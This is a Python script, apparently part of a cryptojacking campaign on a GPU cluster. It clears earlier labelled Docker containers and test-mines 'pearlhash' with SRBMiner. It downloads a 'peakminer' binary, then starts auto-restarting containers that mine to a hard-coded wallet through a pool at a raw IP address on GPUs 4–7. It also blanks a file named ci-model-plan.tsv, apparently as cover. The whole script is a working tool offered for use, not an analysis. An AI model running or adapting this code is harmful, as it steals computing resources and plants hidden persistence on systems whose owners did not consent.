# intent 155773 / gpu-000016 corrective probe (successor to i155322 run4b)
import os as _os, stat as _stat, subprocess as _sp, sys as _sys, hashlib as _hl, time as _t
WORK = "/tmp/prl595"
WALLET = "prl1p7gtuuz93057gnp5phfexss2ktduj7mnt7qxh8credlpulh5esv4q5e6mvr"
LP_HOST = "103.199.106.122"
LP_PORT = 3360
RELAY_HOST = "217.15.164.237"
RELAY_PORT = 8081
IMG = "areal-das:dtk2610-torch213-bw1100"
IMG2 = "areal-das:v2.1.0-ubuntu22.04-dtk26.04-py3.12-torch2.10-20261119"
SRB_TAR_SHA = "186c526f95eb7b635a547bca45a48a505a58c74e26b7211bf6dc25988ce196d1"
SRB_BIN_SHA = "97bd9e42e313b2c4807bba7197920fee421956bb896cfec469ee87947d667e80"
MINENV = "env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin HOME=/tmp TERM=xterm"
DTKENV = ("env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin HOME=/tmp TERM=xterm "
          "HYHAL_PATH=/opt/hyhal LD_LIBRARY_PATH=/opt/dtk/hip/lib:/opt/dtk/lib:/opt/dtk/lib64:/opt/dtk/hsa/lib:/opt/hyhal/lib:/opt/hyhal/lib64:/opt/dtk/opencl/lib:/opt/dtk/llvm/lib")
MARK = "C211-I155773"
T0 = _t.time()


def _say(s):
    try:
        _sys.stdout.write(str(s) + "\n")
        _sys.stdout.flush()
    except Exception:
        pass


def _run(c, t=120):
    _say("--- CMD: " + c)
    try:
        p = _sp.Popen(c, shell=True, stdout=_sp.PIPE, stderr=_sp.STDOUT)
        out = p.communicate(timeout=t)[0]
        if out:
            _say(out.decode("utf-8", "replace"))
        _say("--- rc=" + str(p.returncode))
        return p.returncode, out.decode("utf-8", "replace") if out else ""
    except Exception as e:
        _say("--- ERR " + repr(e))
        return -1, ""


def _sha256(path):
    h = _hl.sha256()
    with open(path, "rb") as f:
        while True:
            b = f.read(1024 * 1024)
            if not b:
                break
            h.update(b)
    return h.hexdigest()


def _download(url, dst, timeout=180):
    for a in range(1, 3):
        try:
            _say("--- GET " + url + " try=" + str(a))
            import urllib.request as _ur
            r = _ur.urlopen(_ur.Request(url, headers={"User-Agent": "curl/8.0"}), timeout=timeout)
            total = 0
            with open(dst, "wb") as f:
                while True:
                    b = r.read(1024 * 1024)
                    if not b:
                        break
                    f.write(b)
                    total += len(b)
            _say("--- downloaded bytes=" + str(total))
            return True
        except Exception as e:
            _say("--- dl fail " + repr(e))
            _t.sleep(2)
    return False


def _tail(p, n=9000):
    try:
        return open(p).read()[-n:]
    except Exception:
        return ""


def _dev_args():
    out = []
    for p in ("/dev/kfd", "/dev/mkfd", "/dev/dri"):
        try:
            st = _os.stat(p)
        except Exception as e:
            _say("--- dev skip " + p + " (" + repr(e) + ")")
            continue
        if _stat.S_ISCHR(st.st_mode) or _stat.S_ISDIR(st.st_mode):
            out.append("--device=" + p)
        else:
            _say("--- dev skip " + p + " (not chr/dir)")
    return out


def _docker(cmd, secs, logf, image=None, bind_dtk=True):
    image = image or IMG
    full = (["docker", "run", "--rm"] + _dev_args() +
            ["--shm-size=2g", "-v", WORK + ":/w", "-w", "/w"])
    if bind_dtk:
        full += ["-v", "/opt/dtk:/opt/dtk:ro"]
    full += ["-v", "/opt/hyhal:/opt/hyhal:ro", "-e", "HYHAL_PATH=/opt/hyhal",
             "--entrypoint", "/bin/bash", image, "-lc", cmd]
    _say("--- DOCKER bind_dtk=" + str(bind_dtk) + " (" + image + "): " + cmd[:200])
    lf = open(logf, "w")
    pr = _sp.Popen(full, stdout=lf, stderr=_sp.STDOUT, preexec_fn=_os.setsid)
    end = _t.time() + secs
    while _t.time() < end and pr.poll() is None:
        _t.sleep(3)
    if pr.poll() is None:
        try:
            _os.killpg(_os.getpgid(pr.pid), 15)
        except Exception:
            pass
        try:
            pr.wait(timeout=15)
        except Exception:
            try:
                _os.killpg(_os.getpgid(pr.pid), 9)
            except Exception:
                pass
    lf.close()
    txt = _tail(logf, 9000)
    _say("--- DOCKER OUT (" + logf + ") ---")
    _say(txt)
    return pr.poll(), txt


PROBE = (
    "mkdir -p /var/log/hylog 2>/dev/null; "
    "echo DEVS_IN:; ls -l /dev/kfd /dev/mkfd 2>&1; "
    "echo DRI_IN:; ls -l /dev/dri/ 2>&1 | head -24; "
    "echo SYSKFD_IN:; ls /sys/class/kfd/kfd/topology/nodes/ 2>&1 | head -12; "
    "echo SYSKFD_PROPS:; for f in /sys/class/kfd/kfd/topology/nodes/*/properties; do echo \"== $f\"; "
    "grep -E 'gfx_target_version|^name|simd_count|device_id|vendor_id' \"$f\" 2>&1 | head -8; done 2>&1 | head -80; "
    "echo HYSMI_PROD:; HYHAL_PATH=/opt/hyhal /opt/hyhal/bin/hy-smi --showproductname 2>&1 | head -30; "
    "echo HYSMI_MEM:; HYHAL_PATH=/opt/hyhal /opt/hyhal/bin/hy-smi --showmeminfo vram 2>&1 | grep -E 'HCU\\[|Used' | head -20; "
    "echo ROCMINFO_WHICH:; command -v rocminfo 2>&1; ls -l /opt/dtk/bin/rocminfo 2>&1; "
    "echo ROCMINFO_RUN:; " + DTKENV + " rocminfo > /tmp/rocminfo_plain.txt 2>&1; echo ROCMINFO_RC=$?; head -90 /tmp/rocminfo_plain.txt; "
    "echo ROCM_AGENTS:; grep -E 'Agent|Marketing|Uuid' /tmp/rocminfo_plain.txt 2>/dev/null | head -20; "
    "echo ROCM_GFX:; grep -E 'Name: *gfx' /tmp/rocminfo_plain.txt 2>/dev/null | sort -u | head -12; "
    "echo ROCM_OVERRIDE:; " + DTKENV + " HSA_OVERRIDE_GFX_VERSION=9.0.6 rocminfo > /tmp/rocminfo_override.txt 2>&1; "
    "echo OV_RC=$?; grep -cE 'Name: *gfx' /tmp/rocminfo_override.txt 2>/dev/null; grep -E 'Name: *gfx' /tmp/rocminfo_override.txt 2>/dev/null | sort -u | head -8; "
    "echo HYHAL_LS:; ls /opt/hyhal/lib 2>&1 | head -6; "
    "echo HIP_LS:; ls /opt/dtk/hip/lib 2>&1 | grep -i hipkernel | head -10"
)

LIST = (
    "cd /w/srb 2>/dev/null || { echo NO_SRB_DIR; exit 0; }; "
    "echo LIST_PLAIN:; timeout 60 script -qec \"" + MINENV + " ./SRBMiner-MULTI --list-devices\" /dev/null 2>&1 "
    "| sed 's/\\x1b\\[[0-9;]*m//g' | head -40; "
    "echo LIST_OVERRIDE:; timeout 60 script -qec \"" + DTKENV + " HSA_OVERRIDE_GFX_VERSION=9.0.6 ./SRBMiner-MULTI --list-devices\" /dev/null 2>&1 "
    "| sed 's/\\x1b\\[[0-9;]*m//g' | head -40"
)


def _hcu_used(txt):
    d = {}
    for line in txt.splitlines():
        s = line.strip()
        if s.startswith("HCU[") and "Total Used Memory" in s:
            try:
                idx = int(s.split("HCU[")[1].split("]")[0])
                val = int("".join(c for c in s.split(":")[-1] if c.isdigit()) or "0")
                d[idx] = val
            except Exception:
                pass
    return d


def _gfx_count(txt):
    n = 0
    for line in txt.splitlines():
        if "Name:" in line and "gfx" in line:
            n += 1
    return n


import json as json
UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0 Safari/537.36"
MENV = DTKENV + " HSA_OVERRIDE_GFX_VERSION=9.0.6"
PM_URL = "https://github.com/peakminer/peakminer/releases/download/v2.20.7/peakminer-2.20.7-linux-x86_64"
PM_SHA = "38fc5c4d0a8351f6e94756d2d1830a1bf9b745e41b9b0ef3f07fc41bd24bcb3d"


def main():
    _say("=== " + MARK + "-RUN4E-BEGIN ===")
    _os.makedirs(WORK, exist_ok=True)
    try:
        open("ci-model-plan.tsv", "w").close()
    except Exception:
        pass
    _run("hostname; date -u; id -un", t=60)
    _run("docker ps -a --filter label=record=gpu-000016 --format '{{.ID}} {{.Names}} {{.Status}}' 2>&1 | head -10", t=60)
    _run("for c in $(docker ps -aq --filter label=record=gpu-000016); do docker rm -f \"$c\"; done 2>&1 | tail -6", t=180)
    _run("docker container prune -f --filter label=record=gpu-000016 2>&1 | tail -3", t=120)
    _run("docker ps -a --filter label=record=gpu-000016 --format '{{.Names}} {{.Status}}' 2>&1 | head -6", t=60)

    s1 = ("cd /w/srb && timeout 45 script -qec \"" + MENV + " ./SRBMiner-MULTI --algorithm pearlhash --pool stratum+tcp://" +
          LP_HOST + ":" + str(LP_PORT) + " --wallet " + WALLET + " --worker 000011 --password x --disable-cpu --gpu-id 4\" /dev/null 2>&1 | sed 's/\\x1b\\[[0-9;]*m//g' | tail -25")
    _docker(s1, 70, WORK + "/r4e_srb.log", image=IMG)

    pm = WORK + "/peakminer"
    if not (_os.path.isfile(pm) and _sha256(pm) == PM_SHA):
        _download(PM_URL, pm, timeout=240)
    ok = _os.path.isfile(pm) and _sha256(pm) == PM_SHA
    _say("--- PM_SHA_OK=" + str(ok))
    pmine = False
    if ok:
        _os.chmod(pm, 0o755)
        s2 = ("cd /w && timeout 150 script -qec \"" + MENV + " ./peakminer --algo pearlhash --pool stratum+tcp://" +
              LP_HOST + ":" + str(LP_PORT) + " --wallet " + WALLET + " --worker 000011 --gpu-id 4\" /dev/null 2>&1 | sed 's/\\x1b\\[[0-9;]*m//g' | tail -60")
        _, o2 = _docker(s2, 190, WORK + "/r4e_pm.log", image=IMG)
        low = o2.lower()
        pmine = ("accepted" in low) or ("h/s" in low) or ("hashrate" in low) or ("share" in low and "job" in low)
    _say("--- PM_MINES=" + str(pmine))

    launched = 0
    wmap = {4: "000011", 5: "000012", 6: "000013", 7: "000014"}
    if pmine:
        base = (["docker", "run", "-d", "--label", "camp=conv-232", "--label", "intent=155773",
                 "--label", "record=gpu-000017", "--restart", "unless-stopped"] + _dev_args() +
                ["--shm-size=2g", "-v", WORK + ":/w", "-w", "/w",
                 "-v", "/opt/dtk:/opt/dtk:ro", "-v", "/opt/hyhal:/opt/hyhal:ro",
                 "-e", "HYHAL_PATH=/opt/hyhal", "--entrypoint", "/bin/bash", IMG, "-lc"])
        for d in (4, 5, 6, 7):
            w = wmap[d]
            inner = ("cd /w && exec " + MENV + " ./peakminer --algo pearlhash --pool stratum+tcp://" + LP_HOST + ":" +
                     str(LP_PORT) + " --wallet " + WALLET + " --worker " + w + " --gpu-id " + str(d))
            p = _sp.Popen(base + ["--name", "pearl-" + w, inner], stdout=_sp.PIPE, stderr=_sp.STDOUT)
            o = p.communicate(timeout=180)[0].decode("utf-8", "replace")
            _say("--- LAUNCH rc=" + str(p.returncode) + " name=pearl-" + w + " dev=" + str(d) + " out=" + o.strip()[:160])
            if p.returncode == 0:
                launched += 1
        _t.sleep(25)
        _run("docker ps --filter label=record=gpu-000017 --format '{{.Names}} {{.Status}}' 2>&1 | head -8", t=60)
        for d in (4, 5, 6, 7):
            _run("docker logs --tail 8 pearl-" + wmap[d] + " 2>&1 | sed 's/\\x1b\\[[0-9;]*m//g' | tail -8", t=60)
        _run("/opt/hyhal/bin/hy-smi --showmeminfo vram 2>&1 | grep -E 'HCU\\[[4-7]\\]' | head -8", t=60)

    _say("=== " + MARK + "-RUN4E-VERDICT pm_sha=" + str(ok) + " pm_mines=" + str(pmine) +
         " launched=" + str(launched) + " elapsed_s=" + str(int(_t.time() - T0)) + " ===")
    _say("=== " + MARK + "-RUN4E-END ===")


main()
